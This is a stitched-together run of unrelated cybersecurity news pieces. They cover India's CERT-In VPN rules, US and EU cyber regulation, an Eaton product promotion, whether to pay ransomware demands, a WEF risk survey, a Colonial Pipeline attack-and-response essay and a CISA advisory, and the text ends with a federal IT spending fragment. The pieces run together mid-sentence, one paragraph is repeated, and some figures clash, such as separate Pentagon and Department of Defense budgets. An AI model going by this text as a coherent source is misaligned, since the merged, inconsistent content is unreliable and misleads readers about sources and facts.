The response to the public criticism has been worrying. The Minister for State for Electronics and IT has in press statements stated that VPN providers should comply with the directions or leave India. These remarks were made alongside the release of a “Frequently Asked Questions (FAQ)” document released on May 18, 2022 that changed little and failed to provide many answers. As per the Ministry itself, this document does not have any legal effect, and hence any clarifications will be left to discretionary practices. While such flexibility is beneficial for the government, it could certainly result in arbitrary and unequal enforcement. Furthermore, the increase in personal data being collected of users without a data protection law will increase risks to individual users if such data is breached.

This complementary relationship between maintaining privacy and security is explained at length by Laura DeNardis in The Internet is Everything when she states, “The considerable amount of data collected also creates a target for data thieves and identity theft and also a target for direct harm to particular individuals…. Privacy depends on cybersecurity .” Oblivious to reason, the CERT-In directions offer security for our privacy, but end up hurting both.

Now some of the US’s top cybersecurity officials—including the White House’s current Cyber director—say the time has come for a stronger government role and regulation in cybersecurity so that fiascos like Colonial don't happen again.

The change in tack comes just as the war in Ukraine, and the heightened threat of new cyberattacks from Russia, is forcing the White House to rethink how it keeps the nation safe.

“We're at an inflection point,” Chris Inglis, the White House’s national cyber director and Biden’s top advisor on cybersecurity, tells MIT Technology Review in his first interview since Russia’s invasion of Ukraine. “When critical functions that serve the needs of society are at issue, some things are just not discretionary.”

The White House’s new cybersecurity strategy consists of stronger government oversight, rules mandating that organizations meet minimum cybersecurity standards, closer partnerships with the private sector, a move away from the current market-first approach, and enforcement to make sure any new rules are followed. It will take its cue from some of the nation’s most famous regulatory landmarks, such as the Clean Air Act or the formation of the Food and Drug Administration.

With looming threats from Russian hackers, the FCC is planning for the prospect of Russians hijacking internet traffic, a tactic they’ve seen Moscow employ in the past. A new FCC initiative, announced March 11, aims to investigate if US telecom companies are doing enough to be secure against the threat. However, it’s a real test for the agency because it doesn't have the power to force companies to comply. They are relying on the possibility of a national security crisis to get them to toe the line.

For many officials, this almost total reliance on the goodwill of the market to keep citizens safe cannot continue.

That said, the directive will not apply to organizations in verticals such as defense, national security, public security, law enforcement, judiciary, parliaments, and central banks.

The revised directive, called ""NIS2"" (short for network and information systems), is expected to replace the existing legislation on cybersecurity that was established in July 2016.

The revamp sets ground rules, requiring companies in energy, transport, financial markets, health, and digital infrastructure sectors to adhere to risk management measures and reporting obligations.

Among the provisions in the new legislation are flagging cybersecurity incidents to authorities within 24 hours, patching software vulnerabilities, and readying risk management measures to secure networks, failing which can incur monetary penalties.

""The directive will formally establish the European Cyber Crises Liaison Organization Network, EU-CyCLONe, which will support the coordinated management of large-scale cybersecurity incidents,"" the Council of the European Union said in a statement last week.

The development closely follows the European Commission's plans to ""detect, report, block, and remove"" child sexual abuse images and videos from online service providers, including messaging apps, prompting concerns that it may undermine end-to-end encryption (E2EE) protections.

The draft version of NIS2 explicitly spells out that the use of E2EE ""should be reconciled with the Member States' powers to ensure the protection of their essential security interests and public security, and to permit the investigation, detection and prosecution of criminal offenses in compliance with Union law.""

It also stresses that ""solutions for lawful access to information in end-to-end encrypted communications should maintain the effectiveness of encryption in protecting privacy and security of communications, while providing an effective response to crime.""

That said, the directive will not apply to organizations in verticals such as defense, national security, public security, law enforcement, judiciary, parliaments, and central banks.

As part of the proposed agreement, the European Union member states are mandated to incorporate the provisions into their national law within a period of 21 months from when the directive goes into force.

Power outages by natural calamity or grid instability may cause damages to and failure of physical equipment, and the often-overlooked cost from loss of critical data and the time required for data recovery should be a key consideration when identifying strategies to ensure business continuity.

These outages can particularly impact small and medium businesses, where IT services and resources may be limited. Investing in a disaster avoidance application can be one of the best ways to help prevent further problems, as it allows business owners to manage, monitor and proactively determine corrective actions prior to power failure events can help in reducing cost of recovery.

Part of Eaton’s Brightlayer Data Center Suite, Eaton's disaster avoidance application - Intelligent Power Manager (IPM), provides the tools needed to monitor and manage power devices in the physical or virtual environment. This innovative software ensures system uptime and data integrity by allowing business owners or IT managers to remotely monitor, manage and control UPS, PDU, servers and other storage devices on the network.

One of the key features of the IPM system is the graceful shutdown setting, which allows SMBs to preserve the functionality of key assets by turning them off when a shutdown occurs, across multiple operating systems. This prevents data from been destroyed and electrical components damaged. With the power capping on demand feature, user can extend the runtime on critical devices during power outages by pre-programming all non-essential devices to power down first. This allows business-critical servers to be operational till back-up system or power are up and running.

“With Eaton IPM, businesses with a hybrid IT environment can easily set up and manage their distributed IT assets via their Eaton power equipment from a central location. This is particularly helpful to ensure quick and safe recovery, where despatching IT personnel on-site may not be possible or cost effective” says Gavin Swadling, Eaton National Sales Manager A/NZ, Power Quality division.

Other features of Eaton’s IPM:

Visualisation of power metrics and constraints

Easy to use wizard-based automation

Vendor agnostic monitoring

Intelligent load shedding

Site recovery manager failover

Power capping on demand

Graceful shutdown within clusters

Complex system protection

Remote automated protection

3 licensing options to suit different business needs

Critical to a network friendly solution is the ability to integrate seamlessly with industry leading IT management systems and providers. With the IPM software, Eaton invested heavily in ensuring and validating that the software operates seamlessly with its alliance partners such as VMware, Cisco, NetApp, Dell, HPE, Nutanix, Scale Computing and ConnectWise

Cybersecurity is also a top priority for Eaton products, and the IPM system is no exception. The software has been proven to be an inexpensive, highly viable air gap solution offering a cost-effective way to automate everyday IT tasks and schedule cybersecurity air gaps.

Some estimates suggest 80 percent of firms that pay a ransom will fall victim again.","What are the Pros and Cons?

Receiving a ransomware demand is something every business dreads. It is no longer a matter of if you will get attacked, but when. Ransomware struck one-third of all organizations in 2021 alone. It’s something that every security team will have to deal with. What’s more, once-standard mitigations such as reverting to backups may no longer be enough to recover data if critical files have been encrypted. Many ransomware demands now threaten to release data publicly if the ransomware demand is not made in a timely manner. Many also release samples to prove they have the data as many victims naively think it’s a bluff or feel they have adequate protections in place. Other threats may include exposing firms to the threat of regulatory action or initiating DDoS attacks to further disrupt operations. And with the clock ticking, firms have to make quick decisions about whether to pay the ransom to avoid further consequences, or brace themselves for the fallout.

The Benefits of Paying a Ransom

Many firms may decide that the easiest way to restore services and remain operational is to simply pay the ransom. As long as everything goes to plan, this can minimize disruption and downtime, as well as avoid significant financial losses beyond the ransom itself. Some firms may also believe this will help them keep the incident quiet and avoid any adverse publicity – although regulatory reporting requirements may still apply depending on the sector they operate in and the information compromised. For organizations in critical sectors such as healthcare, utilities or infrastructure, remaining operational may be such an important consideration that paying the ransom is the only viable option. This was the case in 2021 when US firm Colonial Pipeline paid out around $5 million to ransomware hackers who had successfully shut down a key pipeline, which led to fuel shortages up and down the US east coast. Around $3.3 million of this was later recovered by the FBI. Explaining the decision to a Senate committee hearing later that year, chief executive of the firm Joseph Blount Jr said: “I made the decision that Colonial Pipeline would pay the ransom to have every tool available to us to swiftly get the pipeline back up and running. It was one of the toughest decisions I have had to make in my life.”

Disadvantages of Giving in to Ransomware Demands

One of the biggest issues with paying a ransom is that you’re gambling that hackers will keep to their word and restore systems. Unfortunately, when you’re dealing with criminals, there’s no guarantee. In fact, it’s estimated that as many as 92 percent of firms fail to recover all of their data, with nearly a third losing at least half. If the hackers have successfully exfiltrated data as part of their attack, there’s also no way of knowing what they’ll do with this, even if a ransom is paid. Many cybergangs make additional revenue by selling the data on the dark web, especially if it contains valuable intellectual property or customer data. This can cause significant long term problems for the organization in terms of lost competitiveness and reputational damage. Another issue is that it can expose an organization to further legal action. In the US, for example, many ransomware payments that go to overseas hacking groups could put businesses in violation of international sanctions. A 2021 advisory from the US Treasury warned such payments may breach rules set out by the Office of Foreign Assets Control. Finally, perhaps the biggest issue with paying ransomware is that it encourages future attacks. If the attackers know you pay then they often come back two and even three times, making it impossible to get ahead of the attacks. This isn’t just bad for the cybersecurity sector as a whole – it also paints a big target on individual businesses. Some estimates suggest 80 percent of firms that pay a ransom will fall victim again. Of these, only around half are thought to come from the original hackers, highlighting how quickly weak and profitable targets are disseminated in the cybercriminal network.

Malware attacks increased by 358% in 2020, while ransomware increased 435%, with a four-fold rise in the total cryptocurrency value received by ransomware addresses, said the WEF’s “Global Risks Report 2022, 17th Edition,” which details the results of the survey.

Cyberattacks have intensified over the last two years, which “means that cyberthreats are now growing faster than our ability to prevent and manage them effectively,” said Carolina Klint, risk management leader, Continental Europe, Marsh, who spoke during a virtual press conference to discuss the survey. (The WEF’s partners in the report’s development are Marsh McLennan, SK Group and Zurich Insurance Group).

“Companies trying to survive the pandemic have been under more pressure than ever to digitize and automate. But too often, this has been built on the backbone of aging technology, which has led to supply chain disruptions and greater exposure to cyberattacks, and especially ransomware,” Klint added.

Given the rising costs of cyberattacks, cyber insurance prices are going up, she said, pointing to the example of the U.S. where prices rose by 96% in the third quarter of 2021.

This was the most significant price hike since 2015 and a 204% year-over-year price increase, said the report, quoting statistics from Marsh. “Respondents to the GRPS indicate a long-term concern with these developments, with ‘adverse tech advances’ appearing as a top-10 risk over a 5-to-10-year horizon,” the report confirmed.

“There are plenty of cyber risks that keep the C-suite up at night, but there are four that I want to point out that need to be tackled: critical infrastructure failures, an increasingly aggressive regulatory environment, unprecedented identity theft, and failing to execute digital transformation effectively,” said Klint.

She emphasized that companies soon won’t be able to claim good environmental, social and governance (ESG) credentials without addressing these key areas.

“As companies recover from the pandemic, they are rightly sharpening their focus on organizational resilience and ESG credentials,” said Klint, in a statement accompanying the report. However, she added, it is clear that “neither resilience nor governance are possible without credible and sophisticated cyber risk management plans.”

“[B]usinesses that fail to demonstrate strong corporate governance around cybersecurity – such as by implementing robust systems and process oversight protocols, and by practicing accountability and transparency in the event of a breach – could suffer reputational harm in the eyes of ESG-focused investors,” the report cautioned.

Another problem highlighted by the report is that businesses operate in a world where 95% of cybersecurity issues can be traced to human error, and where insider threats (intentional or accidental) represent 43% of all breaches.

Undersupply of Cyber Professionals

The report noted that already-stretched IT and cybersecurity professionals are under increasing pressure, “not only because of the expansion of remote work but also because of the growing complexity of regulations for data and privacy, even though such regulations are critical to ensuring public trust in digital systems.”

In fact, there is an undersupply of cyber professionals who can provide cyber leadership, test and secure systems, and train people in digital hygiene, said the report, pointing to a worldwide employment gap of more than 3 million cyber security experts.

“As with other key commodities, a continued lack of cybersecurity professionals could ultimately hamper economic growth, although new initiatives to ‘democratize’ cybersecurity, for example, by providing free cybersecurity risk management tools, could help fill some of the gaps for small businesses or other institutions,” the report continued.

Geopolitical Factors

While many governments are attempting to prevent cybersecurity failures, “patchwork enforcement mechanisms across jurisdictions continue to hamper efforts to control cybercrime,” the WEF report said. “Geopolitical rifts hinder potential cross-border collaboration, with some governments unwilling or unable to regulate cyber intrusions that originate inside and impact outside their borders.”

Digital Inequality

In addition to cybersecurity failures, the survey revealed another technological risk — digital inequality — that is viewed by survey respondents as a critical short- and medium-term threat to the world.

“You are starting to see a lot of concern around this sort of fissure that’s developed with 3 billion people that still do not have access to the internet and do not have one major source of earning an income available to them,” said Saadia Zahidi, managing director at WEF, who also spoke at the press conference. Zahidi’s team put together the report.

The report noted that concerns over cybersecurity could further hamper attempts to promote rapid and inclusive digitalization globally.

However, these technological risks (cybersecurity failures and digital inequality) fall back in rankings for the long term (over the next decade) and none appear among the most potentially severe, which suggests lower relevance to respondents, said the report, which suggested that this signals a “possible blind spot in risk perceptions,” given the damage that is possible from cyberattacks.

Survey Methodology

The Global Risks Perception Survey (GRPS), which underpins the Global Risks Report, gathered insights from nearly 1,000 academic, business, government, civil society and thought leaders. In addition, this year’s report draws on the views of over 12,000 country-level leaders in 124 countries who identified critical short-term risks, gathered through the World Economic Forum’s Executive Opinion Survey (EOS). Survey responses were collected from Sept. 8 to Oct. 12, 2021.

Additional coverage of the WEF report and the press conference will be published in the coming days, including articles on emerging, climate change and societal risks.

“US Proposes $1 Million Fine for Colonial Pipeline Ransomware Attack,” by Derek Johnson, SC Media, 9 May 2022.","This past weekend in northern Virginia, we had glorious weather. My wife Kathy and I took the opportunity to do a little antiquing (actually, she did the antiquing and I mostly drove and napped in the car). As I parked near the “Roaches In the Attic Antiques shop,” one of Kathy’s favorites, I just happened to notice on the GPS that we were very close to something called the Colonial Pipeline Dulles Junction.

Yes, that Colonial Pipeline; the energy conduit that gave us all so much trouble back in 2021 when cyber criminals extorted Colonial Pipeline, the company, with ransomware, and the company leadership shut down their gas distribution pipeline just to be safe. I gave Kathy my go-to look (with over 35 years of marriage practice) that said, “We just gotta go see it.” She returned the favor with her own steely gaze, complete with an eye roll, that signified that I could do whatever I wanted as long as I was back by noon to take her to lunch. With permission in hand, I set off to see if I could find anything interesting.

I don’t know what I was expecting, but there wasn’t much to look at. It’s pretty small, a tad tinier than your typical house plot, situated between two neighborhoods near the Dulles International Airport and sitting alongside the Horsepen Run Stream Valley Park. The space is flat and surrounded by a six foot high fence. Inside the perimeter on the left side, is a silver gas pipe, 32 inches in diameter, that protrudes from the ground for maybe 15 horizontal feet and then sinks back into the dirt to continue its journey to Baltimore. This line, line 4, moves roughly 700 thousand barrels of gas per day from Greensboro, North Carolina to Baltimore, Maryland.

It’s one of the many connecting points for the Colonial Pipeline system and is part of the largest pipeline in the United States. The entire system can carry roughly three million barrels of fuel a day over 5,500 miles from Houston to New York. It connects directly to several major airports, including Atlanta, Nashville, Charlotte, Greensboro, Raleigh-Durham, Dulles, and Baltimore-Washington. In other words, this is how your airports on the East Coast get their jet fuel.

When you think of the pipeline in those terms, the scale of it, you quickly realize the significance of the system to the national economy. One small glitch in any of those pipeline junction points from Houston to New York could send rippling waves of energy shortages across the country. The Colonial Pipeline ransomware attack of 2021 did just that, and the attack sequence didn’t even touch the pipeline’s Operational Technology (OT) and Industrial control systems (ICS). The attackers went after the traditional business IT systems. They caused the shortages by being in the general vicinity of the pipeline. That’s kind of scary.

When we talk about cybersecurity first principle strategies, the sexy ones today are zero trust and intrusion kill chains. There were a lot of interesting developments in the 2010s from vendors and security researchers that will contribute to making it easier to deploy those ideas in the future. There isn’t a lot of discussion about resilience and risk forecasting, though. We don’t talk about risk forecasting because it’s hard. We don’t talk about resilience because it's hard and not sexy.

For resilience specifically, I think a lot of us feel like it’s kind of the cybersecurity equivalent of eating your vegetables. And, to pile on, resilience is much bigger than just cybersecurity alone. As my favorite Swedes (Björck, Henkel, Stirna, and Zdravkovic) said in a paper published in 2020, resilience is “… the ability to continuously deliver the intended outcome despite adverse cyber events.” That includes cybersecurity attacks but also an entire slate of other business continuity issues that security leaders don’t own and probably don’t want. Truth be told, the leaders that do own those programs don’t want the CISOs help either.

Still, for the Colonial Pipeline attacks, I think there are some lessons to be learned about resilience by reviewing how the hackers orchestrated their attacks and how the Colonial Pipeline leadership responded. Were there resilience things that could have been improved that would have prevented the crisis? That sounds like a pretty decent cyber sand table exercise to me. Let’s get started.

Setting up the sand table: Colonial Pipeline.

According to Clifford Krauss at the New York Times, the Colonial Pipeline started as a consortium of big oil companies (Phillips, Sinclair, and Continental Oil) back in 1961. Today, it's owned by Royal Dutch Shell, Koch Industries and many other international investment companies. The reason it’s so vital to many Eastern Seaboard airports is that they mostly only have a supply of three-to-five days of fuel stored locally.

Claudia Piccirilli, reporting for the WTW website, said that at the time of the attack, Colonial Pipeline didn’t have a Chief Information Security Officer (CISO), and so the security responsibility for the company’s infosec program fell to the CIO who had been in the seat since 2016.

Let that sink in for a second. In a critical infrastructure company, a company that’s responsible for providing the fuel for many of the airports on the eastern seaboard of the United States, didn’t have an executive dedicated to security. The mind boggles.

Christopher Burgess, from CSO Online, cited an AP interview with a consulting firm, iMerge, that said in a 2018 audit report that Colonial Pipeline’s network security was severely deficient. This is three years before the ransomware attack. That said, the CIO did take some steps to improve the situation by hiring a senior director of technology solutions and increasing the IT budget by 50%--not the security budget, but the IT budget, and presumably some of that money was spent on improving Colonial’s security environment.

Setting up the sand table: Darkside.

The Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation (FBI) almost immediately attributed the Colonial Pipeline cyberattack to a ransomware-as-a-service offering called DarkSide, with headquarters based in Russia but with no known ties to the Russian government. My editor, John Petrik, says that yes, of course, “No known direct ties, but long standing protection, toleration, and enablement by the Russian government. DarkSide was in all probability a privateer.” In other words, Darkside probably had unofficial State approval to harass and disrupt foreign enemies with cyber crime.

Researchers over at Votiro say they started seeing the first instances of the DarkSide service back in November of 2020, but there is some evidence that hackers behind the service were experimenting with the tools as far back as April of 2019. Their typical attack pattern was to compromise the victim and then go dark for a while before launching the ransomware.

In the past, their one-two punch consisted of the exfiltration of data for blackmail purposes and then encryption of that data for ransom purposes. John Petric says that they were early adopters of this double extortion idea. Researchers observed them gaining initial access through phishing attacks. They preferred to target remotely accessible accounts and Virtual Desktop Infrastructure (VDI) and they maintained persistence with the Remote Desktop Protocol (RDP). According to Snir Ben Shimol at Varonis, the Darkside malware checks device language settings to avoid Russian victims (like looking for a Cyrillic keyboard, a mark of a privateer), and it works on both Windows and Linux systems.

On their deep web advertising site, DarkSide’s marketing people (and the gangs do have marketing crews) professed to have an honor code of not attacking hospitals and schools, and they claimed to have on several occasions donated some of their proceeds to charities.

CSO Online’s Cynthia Brumfield interviewed CrowdStrike’s Josh Reynolds and Eric Lou in 2021. Those two attributed the DarkSide attack pattern to another adversary playbook: Carbon Spider (a.k.a. Fin7, a.k.a. G0046, and a.k.a. JokerStash). According to Cynthia, Carbon Spider started in 2013 using the Carbanak malware to target financial institutions. The CrowdStrike researchers said that the group split into two in 2016: Cobalt Spider targeted credit card data theft and Carbon Spider, the group behind the Colonial Pipeline attacks, stayed with financial entities.

Turn one: Carbon Spider (DarkSide), the red team, 29 April - 6 May 2021.

On 29 April, DarkSide hackers started their initial journey across the Colonial Pipeline kill chain. According to Shimol, they gained the initial beachhead into the Colonial Pipeline’s IT infrastructure, not their OT and ICS infrastructure, through a phishing email targeting a contractor who used a VDI system put into place during the pandemic.

Before this, they performed stealthy reconnaissance, and when they did attack, “they took steps to ensure that their attack tools and techniques would evade detection on monitored devices and endpoints.” Shimol says that DarkSide hackers installed the TOR browser on victim machines to establish their main command-and-control (C2) channel. They configured them to run as a persistent service and redirected traffic through the TOR network. He said that his team found evidence of TOR clients on many servers and collected telemetry on many active TOR connections.

As a secondary C2 channel, the DarkSide hackers used Cobalt Strike. The Veronis team found evidence of dozens of Cobalt Strike stagers that Darkside deployed using WinRM (Windows Remote Management). They configured every stager differently and connected each to its own unique remote server, which indicates a relatively large C2 infrastructure. Shimol said that the hackers stored TOR Browser executables on Colonial Pipeline file shares but avoided systems with deployed EDR (Endpoint Detection and Response) clients.

For lateral movement, the Veronis team said that DarkSide hackers logged into many VDI accounts, sometimes several at once, and created .lnk files back to the compromised victim’s home folders. They used these shortcuts to keep track of successful machine breaches and the associated accounts used. They collected credentials using the Mimikatz DCSync attack tool to steal credentials from the entire domain and an Active Directory reconnaissance tool called ADRecon.ps1 that siphoned out information about users, groups, and privilege. They also retrieved browser user profile credentials from Microsoft, Firefox and Google and took care to delete each attack tool after use.

Shimol says that the DarkSide hackers mined data from hundreds of victims’ machines simultaneously using a batch routine and then compressed them into zip files. He said that even though they had gained elevated privileges, they chose to instead reduce restrictions on the various file shares so that normal users without any privilege could access them. “The batch file, target data, and the archives were deleted by the attackers within hours of collection.”

According to Veroinis, DarkSide delivered the ransomware code (the data encryption piece and the accept-payment piece), through the already established C2 infrastructure.

On 6 May, the hackers behind the DarkSide attack completed their exfiltration of 100 gigabytes of data (the equivalent of a stack of paper taller than the tower over the Burj Khalifa, one of the tallest skyscrapers in the world), encrypted everything, and then demanded payment not only to decrypt the data but to prevent the release of it to the public. The actors then threatened to publicly release the data if the ransom was not paid

Turn one: Colonial Pipeline, the blue team, 7 - 15 May 2021.

According to Joseph Blount, the Colonial Pipeline CEO, on 7 May (Friday), just before 5 AM, a control room employee saw the ransom demand appear on his computer screen. Once notified, the employee’s supervisor began shutting down the pipeline as a precautionary step and completed the task by 6:10.

That same day, the Colonial Pipeline leadership team decided to inform the FBI about the attack. They also authorized and delivered the payment of the 75 Bitcoin ransom (nearly $5 million). Let’s pause on that little factoid a second. Within hours of the ransom request, Colonial Pipeline leadership was able to put its hands on $5 million dollars and execute a Bitcoin transaction. I mean, I knew that the oil industry was rich and connected, but if I want to extract $500 dollars out of my own bank account, it usually takes three days. They were able to call the bank, grab a cool $5 million and transfer it out to some shady ransomware players all in one day. I'm just saying .

I have been unable to find this out for sure, but the execution speed for this three-step action list (ransomware notification, notify the FBI, and execute a Bitcoin payment) was so swift that it leads me to believe that this was part of a planned crisis action response; something that the leadership team had practiced and were prepared to execute. I could be wrong about that. I asked the Colonial Pipeline CIO to come on the show to discuss, but she didn’t respond. I don’t blame her either. But I thought I would ask.

The next day, 8 May (Saturday), Colonial Pipeline announced to the public that they had been hit by a ransomware crew and what they were doing about it. Again, this is another piece of evidence that this was part of the crisis action playbook, announce early and keep the public informed. They continued the public broadcast of information throughout the crisis.

But, according to Derek Johnson at SC Media, “The company had a plan in place for undergoing a controlled shut down of pipeline operations in the event of a loss of SCADA or voice communications control, but federal regulations specifically require companies to have and test a plan for resuming operations manually in those conditions. Colonial didn’t do that.”

Incident responder contractors, with help from the FBI, CISA, and the NSA, identified the Colonial Pipeline internal staging servers that DarkSide was using to exfiltrate data and took them offline. This was too late to stop the 100 gigabytes of data already exfiltrated but prevented even more damage. A computer security company specializing in cryptocurrency (Elliptic) announced that it had identified the Bitcoin wallet used by DarkSide to collect the Colonial Pipeline ransom payment.

The next day, 9 May (Sunday), U.S. President Joe Biden declared a state of emergency and removed restrictions concerning fuel transportation by road. On Monday (10 May), Georgia Governor Brian Kemp declared a state of emergency and waived collection of the state’s taxes on diesel and gasoline. President Biden announced that the attacks were of Russian origin but not sponsored by the Russian government, and the FBI confirmed that DarkSide was behind the attack. Colonial Pipeline leadership announced that it had manually opened a piece of the pipeline temporarily (Line 4 from North Carolina to Maryland) for a short period to get the existing oil it had on hand down the line.

On 11 May (Tuesday), CISA and the FBI issued a cybersecurity advisory that described how the DarkSide ransomware worked and provided suggested risk mitigation strategies. Colonial Pipeline outlined their alternative fuel shipping strategies that they now had in place to lessen the impact of the crisis.

The next day, Wednesday (12 May), Colonial Pipeline resumed basic operations. It had taken the previous five days to verify that the pipeline OT and ICS systems weren’t infected by the Darkside ransomware. Still, more than 1,000 gas stations didn’t have any gas and U.S. citizens were in the middle of a “panic-buying” spree across the Southeastern United States. Remember the picture of the guy filling plastic bags at the pump with gasoline, the same kind of plastic bag that would disintegrate in minutes because of its reaction to the fuel? Ya, that kind of panic buying.

On 13 May (Thursday), the FBI announced that it had hacked the DarkSide Bitcoin wallet and moved the digital currency to a wallet that they controlled. Essentially, they stole the money back from DarkSide. Law enforcement officials wouldn’t elaborate on how they did it but, according to Mathew Schwartz writing for Euroinfosec, clues exist. He quotes Pamela Clegg, the director of education and investigations for blockchain analytics at CipherTrace, who claimed that the FBI got the DarkSide wallet key from some other international law enforcement agency who had penetrated the DarkSide cryptocurrency infrastructure prior to the pipeline attacks. According to Schwartz, reading from an affidavit in support of a search warrant filed with the Northern District of California U.S. District Court, “the cryptocurrency was moved through at least six other bitcoin wallets.” The FBI followed the flow of funds until they ended up in a wallet for which they had the private key.

By 15 May (Saturday), Colonial Pipeline had everything turned on again but, at this point, there were over 10,000 gas stations still out of fuel. It still took several days to get back to normal.

Turn two: Carbon Spider (Darkside), the red team, 14 May - 21 July 2021.

On 14 May, Darkside told its affiliates that because of pressure from U.S. law enforcement, it was closing shop. But, many intel analysts were skeptical, and suspected that this was just another rebranding exercise similar to those other ransomware groups in the past had undertaken: like Bitpaymer changing to Dopplepaymer to and ultimately to Grief, or Hermes rebranding from Ryuk to eventually Conti.

According to Cynthia Brumfield at CSO Online, a new ransomware-as-a-service emerged on 21 July, called BlackMatter. CrowdStrike said there was enough overlap in tools in the attack sequence that they were fairly certain the service was just DarkSide operating under another name.

Turn two: Colonial Pipeline, the blue team, 9 May 2022.

Almost to the day, a year after the DarkSide attacks against Colonial Pipeline, The U.S. Department of Transportation announced it was seeking to levy nearly $1 million in fines against Colonial Pipeline for a series of safety violations that they say contributed to the pipeline’s decision to temporarily shut down gas operations on that first day. According to SC Media, Colonial Pipeline leadership welcomes the investigation and wants everybody to know that this was ""the first step in a multi-step regulatory process and we look forward to engaging with PHMSA to resolve these matters."" They also defended the contingency planning in the wake of the ransomware attack, saying it was ""necessary"" and tailored to the company's operating environment.

Colonial Pipeline resilience hotwash.

In this podcast, we talk about cybersecurity first principle strategies. Resilience is one of them, and it’s of the same importance as the other three: zero trust, intrusion kill chain prevention, and risk forecasting. As I said at the top of the essay, resilience is “… the ability to continuously deliver the intended outcome despite adverse cyber events.” Clearly, the Colonial Pipeline response to the DarkSide ransomware attacks did not meet that standard. Not only did the leadership not continuously deliver fuel to their customers during the crisis, but there was an eastern seaboard shortage for over a week. To have a well deployed resilience strategy though, you have to be pretty good at several resilience tactics: crisis planning, backup and encryption of material data, and incident response.

For crisis planning, it appears they had a plan to deal with ransomware and had at least talked about how they would execute it before the crisis happened. The way Colonial Pipeline came out of the gates swinging, immediately shutting down the pipeline, notifying the FBI, and paying the ransom, all on the first day of the attacks, shows some prior planning. As I said, I haven’t confirmed that with anybody at Colonial Pipeline, and the U.S. Department of Transportation has some concerns with the plan they executed. But it looks like they had a plan.

Colonial Pipeline didn’t encrypt their material data, or probably any data for that matter, especially the 100 gigabytes of data DarkSide exfiltrated to their own servers. And it’s unclear if Colonial Pipeline had a decent backup of their material data. That didn’t seem to factor into their incident response plan, though. They saw the ransom demand and immediately shut down the pipeline.

The one bigger error in their plan was that they couldn’t determine whether the ransomware attack was isolated to the IT side of the house or had contaminated the OT and ICS side. They just assumed that everything was contaminated and shut everything down. That was the safe call for sure, but it didn’t meet the resilience standard of continuously delivering the intended outcome.

And I'm not even really talking about how Colonial Pipeline failed to implement the other three first principle strategies either. A simple zero trust tactic, like two-factor authentication, would have prevented the DarkSide initial entry point. But we are focusing on resilience here.

The cybersecurity sandtable.

As I said when I did the OPM sandtable exercise, it’s easy to Monday-morning-quarterback massive failures in preventive cybersecurity. But, for all network defenders, during the heat of the battle, it’s tough to take a beat and reflect on what could be done better next time. This is why cybersecurity sand table exercises are important. When there isn’t a crisis afoot, you can learn quite a bit by taking a few moments to analyze what happened on both sides. I highly recommend you insert them into your first principle programs.

""Cyber actors routinely exploit poor security configurations (either misconfigured or left unsecured), weak controls, and other poor cyber hygiene practices to gain initial access or as part of other tactics to compromise a victim's system,"" CISA says.

SEE: Just in time? Bosses are finally waking up to the cybersecurity threa

The list of actions includes all obvious candidates, such as enabling multi-factor authentication (MFA) on key systems, such as virtual private networks (VPNs), but which are prone to misconfigurations when implemented in complex IT environments.

For example, last year Russian hackers combined a default policy shared by multiple MFA solutions and a Windows printer privilege of escalation flaw to disable MFA for active domain accounts and then establish remote desktop protocol (RDP) connections to Windows domain controllers. This complexity can also be seen in the choice of, deployment and use of VPNs, whose adoption escalated after the pandemic struck.

Recent research by Palo Alto Networks found that 99% of cloud services utilize excessive permissions, against the well-known principle of least privilege to limit opportunities for attackers to breach a system.

The security controls outlined in CISA's list serve as a useful checklist for organizations, many of which deployed remote-working IT infrastructure hastily due to the pandemic, and amid today's heightened geopolitical tensions due to Russia's invasion of Ukraine. It also follows the EU joining the US-Five Eyes in jointly blaming the Russian military on this year's cyberattack against Viasat's European satellite broadband users.

As noted in the joint alert, attackers commonly exploit public-facing applications, external remote services, and use phishing to obtain valid credentials and exploit trusted relationships and valid accounts.

The joint alert recommends MFA is enforced for everyone, especially since RDP is commonly used to deploy ransomware. ""Do not exclude any user, particularly administrators, from an MFA requirement,"" CISA notes.

Incorrectly applied privileges or permissions and errors in access control lists can prevent the enforcement of access control rules and could give unauthorized users or system processes access to objects.

Of course, make sure software is up to date. But also don't use vendor-supplied default configurations or default usernames and passwords. These might be 'user friendly' and help the vendor deliver faster troubleshooting, but they're often publicly available 'secrets'. The NSA strongly urges admins to remove vendor-supplied defaults in its network infrastructure security guidance.

""Network devices are also often pre-configured with default administrator usernames and passwords to simplify setup,"" CISA notes. ""These default credentials are not secure – they may be physically labeled on the device or even readily available on the internet. Leaving these credentials unchanged creates opportunities for malicious activity, including gaining unauthorized access to information and installing malicious software.""

SEE: What is ransomware? Everything you need to know about one of the biggest menaces on the web

CISA notes that remote services, such as VPNs, lack sufficient controls to prevent unauthorized access. Defenders should add access control mechanisms like MFA to reduce risks. Also, put the VPN behind a firewall, and use IDS and IPS sensors to detect suspicious network activity.

Other key problems include: strong password policies are not implemented; open ports and internet-exposed services that can be scanned via the internet by attackers; failure to detect or block phishing using Microsoft Word and Excel documents booby-trapped with malicious macros; and poor endpoint detection and response.

CISA's recommendations include control access measures, implanting credential hardening, establishing centralized log management, using antivirus, employing detection tools and searching for vulnerabilities, maintaining configuration management programs, and implementing patch management.

CISA also recommends adopting a zero-trust security model, but this is likely a long-term goal. US federal agencies have until 2024 to make significant headway on this aim.

These are among the top 25 agencies that ranked the highest in the federal spending data:1.","Government IT spending continues to rise, and government agencies are mainly responsible for it. While the federal government is making a concerted effort to cut costs and streamline operations, the total continues to climb across all areas.

For the fiscal year 2022, the White House proposed an IT budget of $109.4 billion. This includes the $$58.4 billion for civilian agencies, approximately $12.4 billion for the Pentagon, and $38.6 billion for the Department of Defense. It’s an 18.7% increase from last fiscal year’s total budget, which is the highest ever, as seen in the federal spending data.

This article will focus on the most significant factors affecting the government’s IT spending, the top agencies involved, and how to spend smarter to cut costs for the long term.

What are the biggest factors affecting federal government IT spending?

IT spending is expected to increase 11% by 2023 as the government modernizes IT to improve efficiency and productivity while providing better services to its citizens. Here are examples of factors influencing IT spending:

1. Rampant increase of cybercrimes

As cybercrime increases worldwide, it’s becoming a greater priority for governments and businesses to invest in cybersecurity measures such as firewalls, antivirus, and software and encryption tools to protect data against hackers who might steal sensitive information or cause other serious damages through locking and stealing files until victims pay them off with ransom money.

In 2021, the FBI reported that it received 2000 internet cybercrimes daily. Another incident in 2018 was the breaching of NASA’s Jet Propulsion Laboratory, where its hacker was able to steal about 23 files amounting to a half gigabyte of data using a cheap computer, Raspberry Pi.

